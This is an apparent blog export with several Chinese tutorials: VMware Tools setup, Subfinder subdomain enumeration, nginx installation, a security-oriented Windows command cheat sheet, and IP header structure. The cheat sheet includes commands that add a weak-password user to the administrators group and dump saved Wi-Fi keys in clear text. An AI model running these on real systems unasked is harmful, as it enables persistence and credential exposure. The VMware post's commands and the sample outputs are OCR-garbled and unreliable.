[{"content":"VMwaretools 安装 1､点击虚拟机 \u0026raquo; 点击安装VMtools \u0026raquo; 出现安装提示 2､虚拟机 \u0026raquo; 设置 \u0026raquo; 硬件 \u0026raquo; CD/DVD 查看文件是否已经装载:linux.iso 3､root账户\n步骤 3：检查 /dev 目录下的 cdrom 目录 以 root 账户登录系统，在终端中输入以下命令，查看 /dev 目录下是否存在 cdrom（光盘）目录：\n1 ls /dev 可能的输出示例如下（实际输出可能不同）：\n1 qu dn iateny tt 2 L y14 tty24 Zer0 福 1 atrfs-otrol 步骤 4：检查并创建 /mnt/cdrom 目录 在终端中输入以下命令，查看 /mnt 目录下是否存在 cdrom 目录：\n1 ls /mnt 如果 /mnt 目录下不存在 cdrom 目录，则使用以下命令创建该目录：\n1 mkdir /mnt/cdrom 在 Linux 操作系统中，mnt 是一个用于挂载外部设备的目录，mnt 是 mount 的缩写，表示挂载。当需要将外部设备（如硬盘、光盘、USB 设备等）连接到 Linux 系统时，可以使用 mnt 来挂载这些设备。\n步骤 5：挂载 cdrom 到 /mnt/cdrom 目录 使用以下命令将 cdrom 挂载到 /mnt/cdrom 目录下，其中 iso9660 表示光盘或光盘镜像：\n1 mount -t iso9660 /dev/cdrom /mnt/cdrom 挂载完成后，使用以下命令检查是否挂载成功：\n1 ls /mnt/cdrom 可能的输出示例如下（实际输出可能不同）：\n1 TrootBcetoa7 - testr pgrade - 32re - tool - upgrale - 6 步骤 6：拷贝安装包到家目录 使用以下命令将安装包 VMwareTools - 10.3.23 - 16594550.tar.gz 拷贝到家目录（~）：\n1 cp /mnt/cdrom/VMwareTools - 10.3.23 - 16594550.tar.gz ~ 拷贝完成后，可通过查看家目录确认是否拷贝成功。\n步骤 7：解除挂载 使用以下命令解除 cdrom 的挂载：\n1 umount /dev/cdrom 步骤 8：解压安装包 在终端中，使用以下命令解压安装包：\n1 tar -zxvf VMwareTools - 10.3.23 - 16594550.tar.gz 步骤 9：进入安装目录 使用以下命令进入解压后的安装目录：\n1 cd vmware - tools - distrib 步骤 10：运行安装文件 在安装目录下，使用以下命令运行安装文件：\n1 ./vmwera - install.pl 在安装过程中，可能会出现一些提示信息，例如：\n1 2 3 4 5 6 7 8 IHFUT:tu1 HFUTY: ty1 INFUT: ty1 e fil ai vrteo t a HPUT:[M] Te file ustsisudgfs tue that this yogran us atout to listall aircndy HUT:[M] Initializing... linux.iso 镜像下载（坚果云）\n","date":"2025-05-15T23:01:14+08:00","permalink":"https://souljian.cn/p/747321274/","title":"VMwaretools 安装"},{"content":"一、介绍 Subfinder 是一款由 ProjectDiscovery 团队开发的高效子域名收集工具，支持多种被动信息源，能够帮助信息安全从业者和渗透测试人员快速发现目标资产的子域名。本文将详细介绍 Subfinder 的安装、环境配置及常用用法\n二、环境准备(安装 Golang) Golang 官网:https://golang.google.cn/dl/\n本文章以o1.21.6 为例\n下载后执行程序，点击 Next 默认是勾选的，点击 Next 即可 点击 Change 更改安装位置，也可以直接点击 Next 点击 Install\n最后点击 Finish 完成\n右键电脑点击属性，点击高级系统设置 环境变量 测试输入命令\n1 2 3 4 $ go version C:\\Windows\\system32\\cmd.exe 0 x ri所权 C:\\Users\\mz\u0026gt;go version go version go1.21.6 windows/386 C:\\Users\\mz\u0026gt; 三、安装 Subfinder 设置 Golang 代理 1 $ go env -w GOPROXY=https://goproxy.cn,direct 执行命令安装 1 $ go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 执行完后你的C盘用户目录里，go/bin 目录下就会出现文件\n四、使用 Subfinder 输入命令看能否正常使用 1 2 3 4 5 6 7 8 9 $ subfinder -h Subtinder is a subdomin discovery tool that di scovers subdomains for websites by using passive online sources. Usage: subfinder [flag] Flags: INPUT: -d,-1ist string -domain string[] domains to tind subdomains for file containing list of domains for subdomain di scovery SOURCE: ab1e sources. d non-recursive sources recursive -B,-Bources string e exclude-sources string[] specific sources to use for discovery (-s crtsh, ithub). Use -ls to display all avai1 use only sources that can handle subdomains recursively rather than both recursive an use al1 sources for enumeration(s1ow) sources to exclude from erumeration (-es alienault, zoomyeapi) PILTER: \u0026#34;natch string] -filter string[ subdomain or list of subdomain to match (file or comma separated) subdomain or 1ist of subdomain to filter (file or comma separated) RATE-LIMIT: -r1,-rate-limit int maximm rumber of http requests to send per second (g1obal) rls,-rate-limits value maximm rumber of http requests to send per second tor providers in keyvalue format (rls 参数详解 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 Flags: 输入: -d, -domain string[] 要查找子域名的域名 -dL, -list string 包含要进行子域名发现的域名列表的文件 来源: -s, -sources string[] 用于发现的特定来源(-s crtsh,github)｡使用 -ls 显示所有可用来源｡ - 仅使用能够递归处理子域的来源(例如 subdomain.domain.tld vs domain.tld) - 使用所有来源进行枚举(速度较慢) -es, -exclude-sources string[] 从枚举中排除的来源(-es alienvault,zoomeyeapi) 过滤: -m, -match string[] 要匹配的子域名或子域名列表(文件或逗号分隔) -f, -filter string[] 要过滤的子域名或子域名列表(文件或逗号分隔) 速率限制: -rl, -rate-limit int 每秒发送的最大HTTP请求数 -rls value 每秒为四个提供程序发送的最大HTTP请求数(以 key=value 格式,例如 rls \u0026#34;hackertarget=10/s,shodan=15/s\u0026#34;) - 用于解析的并发goroutines数(仅在 -active 模式下)(默认 10) 更新: -up, - 更新 subfinder 到最新版本 -duc, -disable-update-check 禁用自动 subfinder 更新检查 输出: -o, -output string 要写入输出的文件 -oJ, - 以 JSONL(ines) 格式写入输出 -oD, -output-dir string 要写入输出的目录(仅对 -dL 有效) -cs, -collect-sources 在输出中包含所有来源(仅在 -json 模式下有效) -oI, - 在输出中包含主机IP(仅在 -active 模式下有效) 配置: -config string 配置文件路径(默认为 \u0026#34;$CONFIG/subfinder/config.yaml\u0026#34;) -pc, -provider-config string 提供程序配置文件路径(默认为 \u0026#34;$CONFIG/subfinder/provider-config.yaml\u0026#34;) -r string[] 逗号分隔的要使用的解析器列表 -rL, -rlist string 包含要使用的解析器列表的文件 -nW, ... ","date":"2025-05-15T21:50:35+08:00","permalink":"https://souljian.cn/p/747317035/","title":"子域名收集器：Subfinder"},{"content":"本文以nginx为例，介绍Linux中软件的安装与卸载方法。\n一、rpm安装包介绍与管理 （一）rpm的优点 安装软件非常方便。 配套资源丰富。 支持软件包内容校验。 支持多种硬件。 （二）rpm的功能 安装：将软件安装到操作系统。 卸载：将软件移除。 升级：更新软件的新版本。 查询：查询软件包的信息。 验证：验证操作系统中的软件是否为RPM包中的软件。 （三）rpm的用法 查询所有RPM包的个数\n1 [root@centos7-test ~]# rpm -qa | wc -l 示例输出：\n1 444 查询是否安装了nginx软件\n1 [root@centos7-test ~]# rpm -qa | grep nginx 下载nginx\n下载地址：http://rpmfind.net/linux/centos/7.9.2009/os/x86_64/Packages/nginx-1.18.0-1.el7.x86_64.rpm 使用wget下载： 1 [root@centos7-test ~]# wget http://rpmfind.net/linux/centos/7.9.2009/os/x86_64/Packages/nginx-1.18.0-1.el7.x86_64.rpm 安装nginx\n1 [root@centos7-test ~]# rpm -ivh nginx-1.18.0-1.el7.x86_64.rpm 选项说明： -i：安装 -v：显示详细信息 -h：显示安装进度 查询安装的nginx软件\n1 [root@centos7-test ~]# rpm -qa | grep nginx 示例输出：\n1 nginx-1.18.0-1.el7.x86_64 查询RPM包安装到操作系统的所有文件\n1 [root@centos7-test ~]# rpm -ql nginx 示例输出：\n1 2 3 4 5 /etc/nginx /etc/nginx/conf.d /etc/nginx/nginx.conf /usr/sbin/nginx ... 卸载nginx\n1 [root@centos7-test ~]# rpm -e nginx 二、yum安装管理与介绍 （一）yum简介 Yum 是基于 RPM 的软件包管理工具，它提供了 RPM 的仓库，并自动维护 RPM 之间的依赖关系。Yum 可以自动下载 RPM 包及其依赖项，资源丰富，主流 Linux 厂商均支持 Yum。\n（二）yum安装nginx 列出镜像源\n1 [root@centos7-test ~]# yum repolist 查询RPM包\n1 2 [root@centos7-test ~]# yum search nginx [root@centos7-test ~]# yum list | grep nginx 安装RPM包\n1 [root@centos7-test ~]# yum -y install nginx.x86_64 卸载RPM包\n1 [root@centos7-test ~]# yum remove nginx 清除残留文件和配置\n1 [root@centos7-test ~]# sudo yum autoremove 清除缓存\n1 [root@centos7-test ~]# sudo yum clean all 查看yum历史记录\n1 2 [root@centos7-test ~]# yum history [root@centos7-test ~]# yum history info [id] 三、编译安装与卸载 （一）编译安装依赖 在编译安装nginx之前，需要安装一些必要的开发工具和库：\n1 [root@centos7-test ~]# yum -y install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel （二）下载与解压源码 下载nginx源码\n1 [root@centos7-test ~]# wget http://nginx.org/download/nginx-1.18.0.tar.gz 解压源码\n1 [root@centos7-test ~]# tar -zxvf nginx-1.18.0.tar.gz （三）编译安装步骤 进入解压后的目录\n1 [root@centos7-test ~]# cd nginx-1.18.0 配置\n1 [root@centos7-test nginx-1.18.0]# ./configure --prefix=/usr/local/nginx --with-http_ssl_module --prefix：指定安装目录 --with-http_ssl_module：启用SSL模块 编译\n1 [root@centos7-test nginx-1.18.0]# make 安装\n1 [root@centos7-test nginx-1.18.0]# make install （四）服务管理 添加启动脚本\n创建/etc/systemd/system/nginx.service文件： 1 [root@centos7-test ~]# vim /etc/systemd/system/nginx.service 内容如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=/usr/local/nginx/logs/nginx.pid ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf ExecReload=/usr/local/nginx/sbin/nginx -s reload ExecStop=/usr/local/nginx/sbin/nginx -s stop PrivateTmp=true [Install] WantedBy=multi-user.target 启动及管理服务\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 启动nginx服务 [root@centos7-test ~]# systemctl start nginx # 查看nginx状态 [root@centos7-test ~]# systemctl status nginx # 设置开机自启 [root@centos7-test ~]# systemctl enable nginx # 停止服务 [root@centos7-test ~]# systemctl stop nginx # 重新加载配置 [root@centos7-test ~]# systemctl reload nginx 卸载编译安装的nginx\n1 2 3 4 5 6 7 8 9 10 11 # 停止服务 [root@centos7-test ~]# systemctl stop nginx # 删除服务文件 [root@centos7-test ~]# rm -f /etc/systemd/system/nginx.service # 重新加载systemd配置 [root@centos7-test ~]# systemctl daemon-reload # 删除安装目录 [root@centos7-test ~]# rm -rf /usr/local/nginx 通过以上步骤，你可以通过RPM、YUM或编译安装的方式安装和卸载nginx软件。每种方式各有优缺点，可以根据实际需求选择合适的安装与卸载方法。\n","date":"2025-05-01T18:06:09+08:00","permalink":"https://souljian.cn/p/746093969/","title":"Linux中软件安装与卸载"},{"content":"好的，以下是根据文件内容整理的完整笔记，包含所有命令及其说明和实例，采用Markdown格式：\n网络安全相关DOS命令笔记 1. 网络配置与诊断命令 1.1 ipconfig 功能：查看和管理网络配置信息。 常用参数： ipconfig：查看当前网络适配器的IP地址。 ipconfig /all：显示所有网络接口的详细信息，包括IP地址、子网掩码、默认网关、DNS服务器、MAC地址等。 ipconfig /flushdns：清除DNS解析缓存。 ipconfig /displaydns：显示DNS解析缓存的内容。 ipconfig /renew：更新（或重新获取）所有适配器的IP设置参数。 实例： 1 2 ipconfig /all ipconfig /flushdns 1.2 ping 功能：测试网络连接是否正常。 常用参数： ping [网址]：发送默认大小（Windows为32字节，Linux为56字节）的ICMP数据包。 ping -t [网址]：持续ping目标地址。 ping -n [次数] [网址]：指定ping的次数。 ping -l [大小] [网址]：指定ping包的大小。 实例： 1 2 ping -n 5 www.baidu.com ping -l 1024 www.baidu.com 1.3 tracert 功能：追踪网络路由节点。 实例： 1 tracert www.baidu.com 1.4 pathping 功能：结合ping和tracert的功能，显示网络延迟和丢包信息。 实例： 1 pathping www.baidu.com 1.5 netstat 功能：显示网络连接信息。 常用参数： netstat -a：显示所有连接和监听端口。 netstat -r：显示路由信息。 netstat -p [协议类型]：显示特定协议的连接。 netstat -ano：显示网络连接的全面信息，包括进程ID。 实例： 1 2 netstat -anop tcp netstat -an | find \u0026#34;80\u0026#34; 1.6 nslookup 功能：查询DNS解析域名的IP地址。 实例： 1 nslookup www.baidu.com 1.7 netsh 功能：配置和显示网络设置。 常用命令： netsh interface show interface：显示网络接口信息。 netsh advfirewall set allprofiles state on/off：启用/禁用防火墙。 netsh wlan show profiles：显示无线网络配置文件。 实例： 1 2 3 netsh interface show interface netsh advfirewall set allprofiles state on netsh wlan show profiles 1.8 netsh interface ip set address 功能：设置网络接口的IP地址。 实例： 1 2 netsh interface ip set address name=\u0026#34;Local Area Connection\u0026#34; static 192.168.1.10 255.255.255.0 192.168.1.1 netsh interface ip set address name=\u0026#34;Local Area Connection\u0026#34; source=dhcp 1.9 netsh advfirewall firewall add rule 功能：添加防火墙规则。 实例： 1 2 netsh advfirewall firewall add rule name=\u0026#34;Allow Program\u0026#34; dir=in action=allow program=\u0026#34;C:\\path\\to\\program.exe\u0026#34; enable=yes netsh advfirewall firewall add rule name=\u0026#34;Allow Inbound TCP 22\u0026#34; dir=in action=allow protocol=TCP localport=22 enable=yes 1.10 netsh wlan connect 和 netsh wlan delete profile 功能： netsh wlan connect name=\u0026quot;SSID\u0026quot;：连接到无线网络。 netsh wlan delete profile name=\u0026quot;SSID\u0026quot;：删除无线网络配置文件。 实例： 1 2 netsh wlan connect name=\u0026#34;MyWiFi\u0026#34; netsh wlan delete profile name=\u0026#34;MyWiFi\u0026#34; 1.11 netsh interface ip show route 和 netsh interface ip add route 功能： netsh interface ip show route：显示路由表。 netsh interface ip add route：添加静态路由。 实例： 1 2 netsh interface ip show route netsh interface ip add route 192.168.2.0/24 \u0026#34;Local Area Connection\u0026#34; 192.168.1.1 1.12 netsh wlan show profile 功能：显示无线网络配置文件的详细信息，包括密码。 常用命令： netsh wlan show profile：显示所有配置文件。 netsh wlan show profile name=\u0026quot;[SSID]\u0026quot; key=clear：显示特定配置文件的密码。 实例： 1 2 netsh wlan show profile netsh wlan show profile name=\u0026#34;WiFi-Name\u0026#34; key=clear 1.13 cipher 功能：显示或更改NTFS分区上的文件和文件夹的加密状态。 常用参数： cipher /e [目录或文件]：加密指定的文件或目录。 cipher /d [目录或文件]：解密指定的文件或目录。 cipher /s:[目录]：对指定目录及其所有子目录进行操作。 cipher /k：创建新的文件加密密钥。 cipher /r:[文件名]：生成恢复证书和私钥。 实例： 1 2 3 cipher /e D:\\SecretFiles cipher /d D:\\DecryptedFiles cipher /s:C:\\ImportantData 1.14 whoami 功能：显示当前用户的用户名、组成员资格和权限信息。 常用参数： whoami /user：显示当前用户名和SID。 whoami /groups：显示用户所属组。 whoami /priv：显示当前用户的所有权限。 whoami /all：显示所有用户信息。 实例： 1 2 3 4 whoami whoami /user whoami /groups whoami /priv 1.15 runas 功能：以其他用户身份运行命令或程序。 常用命令： runas /user:[域名\\用户名] [程序]：以指定用户身份运行程序。 runas /savecred /user:[域名\\用户名] [程序]：保存凭据并运行程序。 实例： 1 2 runas /user:administrator cmd.exe runas /savecred /user:domain\\username \u0026#34;notepad C:\\path\\to\\file.txt\u0026#34; 1.16 cacls/icacls 功能：显示或修改文件的访问控制列表（ACL）。 常用命令（icacls）： icacls [文件或目录] /grant [用户名]:[权限]：授予权限。 icacls [文件或目录] /deny [用户名]:[权限]：拒绝权限。 icacls [文件或目录] /remove [用户名]：删除用户的所有权限。 icacls [文件或目录] /setowner [用户名]：设置所有者。 icacls [文件或目录] /inheritance:e|d|r：启用、禁用或删除继承。 实例： 1 2 3 4 icacls file.txt icacls folder /grant Everyone:(OI)(CI)F icacls secure.txt /deny Users:F icacls folder /inheritance:d 1.17 certutil 功能：管理证书和证书服务。 常用命令： certutil -hashfile [文件] [算法]：计算文件的哈希值。 certutil -encode [源文件] [目标文件]：Base64编码文件。 certutil -decode [源文件] [目标文件]：Base64解码文件。 certutil -viewstore [存储名称]：查看证书存储。 实例： 1 2 3 4 certutil -hashfile file.exe MD5 certutil -hashfile important.zip SHA256 certutil -encode source.bin encoded.txt certutil -decode encoded.txt decoded.bin 2. 远程连接与服务管理 2.1 telnet 功能：远程登录和管理服务器。 开启步骤： 服务端：在控制面板中启用Telnet服务器。 客户端：在控制面板中启用Telnet客户端。 连接命令： telnet [IP地址] [端口]：连接到指定IP和端口。 实例： 1 telnet 192.168.1.100 23 2.2 net 功能：管理网络资源和服务。 常用命令： net start [服务名]：启动服务。 net stop [服务名]：停止服务。 net user [用户名] [密码] /add：创建用户。 net localgroup [组名] [用户名] /add：将用户添加到组。 实例： 1 2 3 net start wuauserv net user mz 1234 /add net localgroup administrators mz /add 2.3 sc 功能：管理服务。 常用命令： sc start [服务名]：启动服务。 sc stop [服务名]：停止服务。 sc create [服务名] binPath=[路径]：创建服务。 sc delete [服务名]：删除服务。 实例： 1 2 3 sc start MyService sc create NewService binPath=\u0026#34;C:\\path\\to\\service.exe\u0026#34; sc delete OldService 3. 系统管理与任务调度 3.1 tasklist 功能：显示系统进程。 常用参数： tasklist：显示所有进程。 tasklist /svc：显示svchost.exe提供的服务。 tasklist /m [模块名]：显示调用指定模块的进程。 实例： 1 2 tasklist /svc tasklist /m shell32.dll 3.2 taskkill 功能：终止进程。 常用参数： taskkill /PID [进程ID]：根据进程ID终止进程。 taskkill /IM [进程名]：根据进程名终止进程。 taskkill /F /IM [进程名]：强制终止进程。 实例： 1 2 taskkill /IM notepad.exe taskkill /F /IM notepad.exe 3.3 schtasks 功能：管理计划任务。 常用参数： /create：创建任务。 /query：查询任务。 /change：更改任务。 /delete：删除任务。 /run：运行任务。 /end：中止任务。 实例： 1 2 3 schtasks /create /tn \u0026#34;MyTask\u0026#34; /tr \u0026#34;C:\\Path\\To\\MyProgram.exe\u0026#34; /sc daily /st 08:00 schtasks /run /tn \u0026#34;MyTask\u0026#34; schtasks /delete /tn \u0026#34;MyTask\u0026#34; /f 4. 文件系统与安全 4.1 fsutil 功能：管理文件系统。 常用命令： fsutil fsinfo volumeinfo [驱动器]：查询驱动器信息。 fsutil volume diskfree [驱动器]：显示驱动器空间信息。 fsutil file createnew [路径] [大小]：创建新文件。 实例： 1 2 fsutil fsinfo volumeinfo C: fsutil file createnew C:\\test.txt 1024 4.2 attrib 功能：查看和修改文件属性。 常用参数： +h：隐藏文件。 -h：取消隐藏。 +r：设置只读属性。 -r：取消只读属性。 +s：设置系统文件属性。 -s：取消系统文件属性。 实例： 1 2 attrib +h C:\\test.txt attrib -r C:\\test.txt 4.3 sfc 功能：扫描并修复系统文件。 常用命令： sfc /scannow：扫描并修复损坏的系统文件。 实例： 1 sfc /scannow 5. 其他实用命令 5.1 set 功能：显示、设置或删除环境变量。 实例： 1 2 set VAR_NAME=value set VAR_NAME=new_value 5.2 assoc 功能：查看和修改文件扩展名关联。 实例： 1 2 assoc .txt=txtfile assoc .txt=htmlfile 6. 高级网络管理 6.1 net time 功能：查询远程主机的时间。 实例： 1 net time \\\\192.168.1.100 6.2 net user 和 net localgroup 功能： net user [用户名] [密码] /add：创建用户。 net user [用户名] /del：删除用户。 net user [用户名] /active:no/yes：启用或禁用用户。 net localgroup [组名] [用户名] /add：将用户添加到组。 实例： 1 2 3 net user mz 1234 /add net user mz /del net localgroup administrators mz /add 6.3 net start 和 net stop 功能： net start [服务名]：启动服务。 net stop [服务名]：停止服务。 实例： 1 2 net start wuauserv net stop wuauserv 7. 文件与目录管理基础命令 7.1 dir 功能：列出目录内容和文件属性。 常用参数： dir：显示当前目录的文件和文件夹。 dir /a：显示包括隐藏文件和系统文件在内的所有文件。 dir /s：递归显示所有子目录中的文件。 dir /b：只显示文件名，不显示其他信息。 dir /o:n：按名称排序。 dir /o:s：按大小排序。 dir /o:d：按日期排序。 实例： 1 2 3 dir /a /s C:\\Windows dir *.txt /b /s dir /o:s 7.2 cd（Change Directory） 功能：切换当前目录。 常用命令： cd [路径]：切换到指定路径。 cd..：返回上一级目录。 cd\\：返回到根目录。 cd /d D:：切换到其他驱动器。 实例： 1 2 3 4 cd C:\\Program Files cd.. cd\\ cd /d D:\\Documents 7.3 md/mkdir 功能：创建目录。 实例： 1 2 3 md NewFolder mkdir \u0026#34;My Documents\u0026#34; mkdir C:\\Path\\To\\NewFolder 7.4 rd/rmdir 功能：删除目录。 常用参数： rd [目录名]：删除指定的空目录。 rd /s [目录名]：递归删除指定目录及其所有子目录和文件。 rd /q [目录名]：安静模式，不提示确认。 实例： 1 2 rd EmptyFolder rd /s /q FullFolder 7.5 copy 功能：复制文件。 常用参数： copy [源文件] [目标文件]：将源文件复制到目标位置。 copy [源文件1]+[源文件2] [目标文件]：合并多个文件。 copy /y [源文件] [目标文件]：不提示确认覆盖。 实例： 1 2 3 copy file.txt D:\\backup.txt copy file1.txt+file2.txt combined.txt copy /y source.txt destination.txt 7.6 xcopy 功能：增强版的文件复制命令，支持目录树复制。 常用参数： xcopy [源] [目标] /e：复制包括空目录在内的目录和子目录。 xcopy [源] [目标] /s：复制目录和子目录，但不包括空目录。 xcopy [源] [目标] /h：包括隐藏文件和系统文件。 xcopy [源] [目标] /d:日期：只复制在指定日期或之后更改的文件。 xcopy [源] [目标] /y：不提示确认覆盖。 实例： 1 2 xcopy C:\\SourceFolder D:\\DestFolder /e /h /y xcopy *.doc D:\\Backup /s 7.7 move 功能：移动文件或重命名文件/目录。 常用命令： move [源文件] [目标文件]：移动文件或重命名文件。 move /y [源文件] [目标文件]：不提示确认覆盖。 实例： 1 2 3 move file.txt D:\\NewLocation\\ move OldName.txt NewName.txt move OldFolder NewFolder 7.8 del/erase 功能：删除文件。 常用参数： del [文件名]：删除指定文件。 del /f [文件名]：强制删除只读文件。 del /s [目录]：删除指定目录及其所有子目录中的指定文件。 del /q [文件名]：安静模式，不提示确认。 del /a:[属性] [文件名]：根据文件属性删除文件。 实例： 1 2 3 4 del file.txt del /f readonly.txt del /s /q *.tmp del /a:h hiddenfile.txt 7.9 type 功能：显示文本文件内容。 实例： 1 2 type readme.txt type config.ini | more 8. 系统信息与诊断命令 8.1 systeminfo 功能：显示详细的系统配置信息。 常用参数： systeminfo：显示完整的系统信息。 systeminfo | findstr /i \u0026quot;内存\u0026quot;：过滤显示内存相关信息。 systeminfo /s [计算机名] /u [用户名] /p [密码]：获取远程计算机的系统信息。 实例： 1 2 3 systeminfo systeminfo | findstr /i \u0026#34;OS\u0026#34; systeminfo \u0026gt; sysinfo.txt 8.2 driverquery 功能：列出所有已安装的设备驱动程序。 常用参数： driverquery：显示所有驱动程序的基本信息。 driverquery /v：显示详细信息。 driverquery /fo [格式]：以指定格式输出（TABLE、LIST或CSV）。 driverquery /s [计算机名] /u [用户名] /p [密码]：查询远程计算机的驱动程序。 实例： 1 2 3 driverquery driverquery /v /fo csv \u0026gt; drivers.csv driverquery | findstr \u0026#34;Microsoft\u0026#34; 8.3 wmic 功能：通过WMI获取系统和设备信息。 常用命令： wmic os get [属性]：获取操作系统信息。 wmic process list [选项]：列出进程信息。 wmic startup list [选项]：列出启动项。 wmic product get [属性]：获取已安装软件的信息。 wmic diskdrive get [属性]：获取硬盘信息。 实例： 1 2 3 4 5 wmic os get Caption,Version,BuildNumber wmic process list brief wmic startup list full wmic product get Name,Version,Vendor wmic diskdrive get Model,Size,Status 8.4 chkdsk 功能：检查磁盘并修复错误。 常用参数： chkdsk [盘符]：检查磁盘但不修复错误。 chkdsk [盘符] /f：检查磁盘并修复错误。 chkdsk [盘符] /r：检查磁盘、修复错误并恢复可读信息。 chkdsk [盘符] /x：如有必要强制卸载卷，然后开始检查。 实例： 1 2 3 chkdsk C: chkdsk D: /f chkdsk E: /r 8.5 hostname 功能：显示或设置主机名。 实例： 1 hostname 8.6 msinfo32 功能：显示系统信息摘要。 实例： 1 2 msinfo32 msinfo32 /nfo sysinfo.nfo 8.7 powercfg 功能：管理电源设置和生成能源使用报告。 常用命令： powercfg /list：列出所有电源计划。 powercfg /setactive [GUID]：设置活动电源计划。 powercfg /energy：生成系统能源效率诊断报告。 powercfg /batteryreport：生成电池健康状况报告。 powercfg /hibernate on|off：启用或禁用休眠。 实例： 1 2 3 4 powercfg /list powercfg /energy powercfg /batteryreport /output C:\\battery_report.html powercfg /hibernate off 8.8 verifier 功能：验证和检测驱动程序的问题。 常用命令： verifier /standard /all：对所有驱动程序启用标准设置。 verifier /query：显示当前设置。 verifier /reset：禁用驱动程序验证程序。 实例： 1 2 3 verifier /standard /all verifier /query verifier /reset 8.9 eventcreate 功能：创建自定义事件日志条目。 常用参数： /s [计算机名]：指定远程计算机。 /t [类型]：指定事件类型（ERROR、WARNING、INFORMATION、SUCCESS、FAILURE）。 /id [事件ID]：指定事件ID。 /d [描述]：指定事件描述。 /l [日志名]：指定日志文件名。 实例： 1 2 eventcreate /t ERROR /id 100 /l APPLICATION /d \u0026#34;测试错误事件\u0026#34; eventcreate /t INFORMATION /id 200 /l SYSTEM /d \u0026#34;系统维护信息\u0026#34; 以上是完整的笔记内容，涵盖了文件中提到的所有命令及其功能和实例。希望这些内容对你有所帮助！\n","date":"2025-05-01T17:32:36+08:00","permalink":"https://souljian.cn/p/746091956/","title":"基础dos命令"},{"content":"IP数据报文概述 IP（Internet Protocol）数据报文是互联网协议中最基础的数据传输单元。每个IP数据报都包含了确保数据能够正确传输所需的各种信息。本文将详细介绍IP数据报文的各个字段及其作用。\nIP数据报文结构 IP数据报文主要由首部和数据两部分组成。其中首部包含了控制信息，而数据部分包含了上层协议的数据。\n首部字段详解 版本（Version）- 4位\n用于标识IP协议的版本 IPv4的值为4，IPv6的值为6 首部长度（IHL，Internet Header Length）- 4位\n标识IP首部的长度 以32位（4字节）为单位 最小值为5（表示20字节），最大值为15（表示60字节） 服务类型（Type of Service）- 8位\n用于指定服务质量 包含优先级和服务类型信息 现代网络中常用于区分服务（DiffServ） 总长度（Total Length）- 16位\n标识整个IP数据报的长度 包括首部和数据部分 最大值为65535字节 标识（Identification）- 16位\n用于分片重组 同一数据报的所有分片具有相同的标识值 标志（Flags）- 3位\n控制数据报分片 包括： DF（Don\u0026rsquo;t Fragment）：禁止分片 MF（More Fragments）：后面还有分片 片偏移（Fragment Offset）- 13位\n指示分片在原始数据报中的位置 以8字节为单位 生存时间（TTL，Time To Live）- 8位\n防止数据报无限循环 每经过一个路由器减1 当值为0时，数据报被丢弃 协议（Protocol）- 8位\n指示上层协议类型 常见值： 1 = ICMP 6 = TCP 17 = UDP 首部校验和（Header Checksum）- 16位\n用于检验首部的完整性 不包括数据部分的校验 源IP地址（Source Address）- 32位\n发送方的IP地址 目的IP地址（Destination Address）- 32位\n接收方的IP地址 选项（Options）- 可变长度\n可选字段 包含特殊处理信息 很少使用 IP数据报文分片 当IP数据报文大小超过网络的MTU（最大传输单元）时，需要进行分片处理：\n分片规则\n每个分片都必须是8字节的整数倍 除最后一个分片外，其他分片的大小应该相等 所有分片都保持相同的标识字段值 分片重组\n目的主机负责重组 根据标识字段和片偏移进行重组 MF标志位用于判断是否为最后一个分片 实际应用举例 MTU发现 1 ping -D -s 1472 8.8.8.8 # 测试最大MTU 查看IP报文结构 1 tcpdump -xx -i eth0 # 抓取并显示完整的IP报文 IP数据报文结构图 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 比特 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ 0 |版本号(4) |首部长度(4) | 服务类型(8) | 总长度(16) | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ 32 | 标识(16) |标志(3)| 片偏移(13) | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ 64 | 生存时间(8) | 协议(8) | 首部校验和(16) | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ 96 | 源IP地址(32) | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ 128 | 目的IP地址(32) | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ 160 | 选项 + 填充(可变长度) | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ | 数据部分(可变长度) | +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+ 服务类型(ToS)字段详细结构 1 2 3 4 5 6 7 8 9 10 11 0 1 2 3 4 5 6 7 +---+---+---+---+---+---+---+---+ | 优先级 | D | T | R | C |未用| +---+---+---+---+---+---+---+---+ 其中： - 优先级(0-2位)：指定数据包的优先级 - D(3位)：延迟，0=普通，1=低延迟 - T(4位)：吞吐量，0=普通，1=高吞吐量 - R(5位)：可靠性，0=普通，1=高可靠性 - C(6位)：成本，0=普通，1=最小成本 - 未用(7位)：保留位 首部结构说明 固定部分（20字节）\n版本号到首部校验和的部分 每个IP数据报必须包含的内容 长度固定不变 可变部分（最多40字节）\n选项字段 填充字段 长度可变，必须是32位的整数倍 数据部分\n可变长度 承载上层协议的数据 受MTU限制 IP首部结构表 基本结构（按字节分布） 字节位置 0 1 2 3 0-3 版本(4位)+首部长度(4位) 服务类型(8位) 总长度(16位) 4-7 标识符(16位) 标志(3位)+片偏移(13位) 8-11 生存时间(8位) 协议(8位) 